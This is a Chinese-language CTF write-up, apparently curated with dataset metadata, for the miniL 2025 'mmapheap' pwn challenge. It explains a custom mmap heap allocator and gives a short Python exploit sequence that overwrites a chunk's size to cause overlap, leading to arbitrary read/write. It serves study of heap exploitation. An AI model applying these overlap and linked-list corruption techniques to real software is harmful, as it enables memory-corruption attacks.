---
title: miniL 2025 mmapheap 题解
contest: miniL
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [custom-mmap-heap, doubly-linked-list, tcache-style, glibc-2.35, large-chunk, chunk-overlap]
attack_chain:
  - 自定义 mmap heap 分配器
  - node_header: chunk_start/num/base/end/prev/next
  - Add paper/Edit/Delete/Show/Load
  - 65536 字节触发 mmap
  - 65184 字节切分 chunk
  - 改 chunk size (overflow 0x300-0x20-0xd0)
  - 跨 mmap 段覆盖
key_payload: mmap 段切分 + 双向链表 + chunk overlap
one_liner: miniL 2025 mmapheap 题解，自定义 mmap 分配器 + 双向链表 chunk 攻击。
lesson: 自定义分配器逆向关键是看 chunk_header 结构和链表操作。
quality: high
---

miniL 2025 mmapheap 题解（来源 ctfiot）。

**自定义 heap 数据结构**
```c
struct node_header {
    void* chunk_start;    // 真正 chunk 起始（v4 + 6）
    void* num;           // 计数器，归零触发 munmap
    void* base;          // v4 起始
    void* end;           // v4 + len
    void* prev;          // 双向链表
    void* next;
};
struct chunk {
    int64 size;
    chunk* next;
    userdata;
};
```

**初始化逻辑**
```c
v4[2] = v4;                  // start_add
v4[3] = (char*)v4 + len;     // end
*v4 = v4 + 6;                // real chunk start
v4[1] = 0LL;                 // counter = 0
v4[4] = &list_head;          // prev = head
v4[5] = qword_4048;          // next 指向 head 的 prev
```

**菜单**
- 1. Add paper
- 2. Edit paper
- 3. Delete paper
- 4. Show paper
- 5. Load paper (从文件读)

**利用链**：
```python
add(p, 0, 65440, b'a')        # 触发 mmap
add(p, 1, 64688, b'a')        # 切分
add(p, 1, 0x1f0, b'a')
add(p, 14, 64702, b'a')
add(p, 2, 0x2f0, b'b'*0x2f0)

size = 0x300 - 0x20 - 0xd0
edit(p, 1, b'a'*0x100 + p64(size))  # 改 chunk size 触发 overlap
```

**核心思路**：
- 65536 字节大块 mmap
- 切分多个 chunk
- 改其中一个 chunk 的 size 字段 → overlap
- 利用 overlap 修改 chunk_header 链表指针
- 写 fake chunk 触发任意地址读/写

整篇是"自定义分配器 + 双向链表攻击"经典题型。
